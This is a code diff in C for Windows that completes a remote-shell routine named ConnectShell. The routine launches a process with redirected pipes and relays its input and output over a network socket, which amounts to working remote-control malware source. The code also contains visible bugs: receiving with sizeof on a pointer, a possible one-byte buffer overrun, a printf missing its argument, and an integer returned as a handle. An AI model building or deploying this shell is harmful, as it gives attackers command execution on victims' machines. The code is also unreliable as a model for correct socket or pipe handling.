@@ -62,13 +62,54 @@ int ConnectShell(char *path, SOCKADDR_IN sockaddr)
     HANDLE hEvent = WSACreateEvent();
     WSAEventSelect(sock, hEvent, FD_READ | FD_CLOSE);
 
-    ProcessStart(path, &IpcPipe);
+    HANDLE hProcess = ProcessStart(path, &IpcPipe);
 
+    DWORD dwOut = 0, dwRead = 0;
+    char Buffer[1024];
+
+    while (TRUE)
+    {
+        ZeroMemory(Buffer, sizeof(Buffer));
+        if (PeekNamedPipe(IpcPipe.hParentRead, NULL, 0, NULL, &dwOut, NULL) && dwOut > 0)
+        {
+            ReadFile(IpcPipe.hParentRead, Buffer, sizeof(Buffer), &dwRead, NULL);
+            Buffer[dwRead] = NULL;
+            DataSend(sock, Buffer);
+        }
+
+        WSANETWORKEVENTS NetworkEvents = { 0, };
+        if (WSAEnumNetworkEvents(sock, hEvent, &NetworkEvents) == SOCKET_ERROR)
+        {
+            printf("[-] WSAEnumNetworkEvents failed!\n");
+            printf("[+] GetLastError : %d\n", GetLastError());
+            continue;
+        }
+
+        if (NetworkEvents.lNetworkEvents & FD_READ)
+        {
+            DataRecv(sock, Buffer);
+            WriteFile(IpcPipe.hParentWrite, Buffer, strlen(Buffer), NULL, NULL);
+        }
+        else if (NetworkEvents.lNetworkEvents & FD_CLOSE)
+        {
+            printf("[*] Socket closed\n");
+            break;
+        }
+
+        if (WaitForSingleObject(hProcess, 0) == 0)
+        {
+            printf("[*] Process terminated!\n");
+            DataSend(sock, "[*] Process terminated!");
+            break;
+        }
+    }
+
+    TerminateProcess(hProcess, 0);
     closesocket(sock);
     CloseHandle(hEvent);
 }
 
-int ProcessStart(char *path, IPC_PIPE *IpcPipe)
+HANDLE ProcessStart(char *path, IPC_PIPE *IpcPipe)
 {
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
@@ -96,5 +137,18 @@ int ProcessStart(char *path, IPC_PIPE *IpcPipe)
         printf("[+] GetLastError : %d\n");
         return 1;
     }
+
     CloseHandle(pi.hThread);
+
+    return pi.hProcess;
+}
+
+int DataSend(SOCKET s, char *Buffer)
+{
+    return send(s, Buffer, strlen(Buffer), 0);
+}
+
+int DataRecv(SOCKET s, char *Buffer)
+{
+    return recv(s, Buffer, sizeof(Buffer), 0);
 }
